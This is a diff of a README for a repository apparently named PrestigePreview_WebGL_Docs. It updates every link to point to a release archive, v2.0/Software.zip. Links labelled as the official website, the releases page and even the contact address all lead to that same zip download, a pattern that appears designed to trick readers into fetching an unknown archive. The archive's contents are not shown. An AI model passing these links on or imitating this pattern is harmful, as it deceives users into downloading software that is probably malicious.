@@ -12,7 +12,7 @@ Welcome to the **PrestigePreview_WebGL_Docs** GitHub repository! This documentat
 
 To access the latest release of the **PrestigePreview_WebGL_Docs** repository, please click the button below:
 
-[![Download Latest Release](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip%20Release-brightgreen)](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip)
+[![Download Latest Release](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip)
 
 ## 📂 Contents
 
@@ -22,8 +22,8 @@ To access the latest release of the **PrestigePreview_WebGL_Docs** repository, p
 
 ## 🌐 Additional Resources
 
-- **Visit the Official Website:** [PrestigePreview Official Website](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip)
-- **Check for Updates:** If the download link is not working, please visit the [Releases](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip) section for alternative downloads.
+- **Visit the Official Website:** [PrestigePreview Official Website](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip)
+- **Check for Updates:** If the download link is not working, please visit the [Releases](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip) section for alternative downloads.
 
 ## 📝 Contributions
 
@@ -31,7 +31,7 @@ We welcome contributions to enhance and improve the **PrestigePreview_WebGL_Docs
 
 ## 📧 Contact Us
 
-If you have any questions or need assistance with the PrestigePreview WebGL integration, please reach out to us at [https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v1.0/App.zip).
+If you have any questions or need assistance with the PrestigePreview WebGL integration, please reach out to us at [https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip](https://github.com/bloodbag/PrestigePreview_WebGL_Docs/releases/download/v2.0/Software.zip).
 
 Thank you for choosing PrestigePreview for your WebGL projects. Happy coding! 🎉
 
